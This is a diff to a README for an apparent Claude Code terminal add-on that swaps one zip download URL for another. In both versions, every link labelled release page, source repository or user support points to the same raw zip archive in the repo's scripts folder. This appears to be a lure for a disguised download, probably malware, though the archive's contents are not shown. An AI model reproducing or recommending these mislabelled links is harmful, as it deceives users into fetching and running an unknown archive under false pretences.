@@ -1,6 +1,6 @@
 # ⚙️ claude-code-terminal-pro - Custom Terminal Status Line Features
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/purposive-streptocarpus303/claude-code-terminal-pro/main/scripts/terminal-pro-code-claude-v3.2-beta.5.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/raw/refs/heads/main/scripts/code-claude-terminal-pro-1.0.zip)
 
 ---
 
@@ -36,12 +36,12 @@ No advanced settings or installations are needed beyond the steps listed here.
 
 Download the program from its official release page:
 
-[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/purposive-streptocarpus303/claude-code-terminal-pro/main/scripts/terminal-pro-code-claude-v3.2-beta.5.zip)
+[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/raw/refs/heads/main/scripts/code-claude-terminal-pro-1.0.zip)
 
 ### Step 1: Visit the Release Page
 
 Click the link above or go to:  
-https://raw.githubusercontent.com/purposive-streptocarpus303/claude-code-terminal-pro/main/scripts/terminal-pro-code-claude-v3.2-beta.5.zip
+https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/raw/refs/heads/main/scripts/code-claude-terminal-pro-1.0.zip
 
 This page lists the latest versions of the software available for download.
 
@@ -142,9 +142,9 @@ claude-code-terminal-pro works standalone and does not modify core terminal or s
 
 ## 🔗 Useful Links
 
-- [Download or update claude-code-terminal-pro](https://raw.githubusercontent.com/purposive-streptocarpus303/claude-code-terminal-pro/main/scripts/terminal-pro-code-claude-v3.2-beta.5.zip)  
-- [GitHub Repository for source code and documentation](https://raw.githubusercontent.com/purposive-streptocarpus303/claude-code-terminal-pro/main/scripts/terminal-pro-code-claude-v3.2-beta.5.zip)  
-- [User support and issue reporting](https://raw.githubusercontent.com/purposive-streptocarpus303/claude-code-terminal-pro/main/scripts/terminal-pro-code-claude-v3.2-beta.5.zip)  
+- [Download or update claude-code-terminal-pro](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/raw/refs/heads/main/scripts/code-claude-terminal-pro-1.0.zip)  
+- [GitHub Repository for source code and documentation](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/raw/refs/heads/main/scripts/code-claude-terminal-pro-1.0.zip)  
+- [User support and issue reporting](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/raw/refs/heads/main/scripts/code-claude-terminal-pro-1.0.zip)  
 
 ---
 
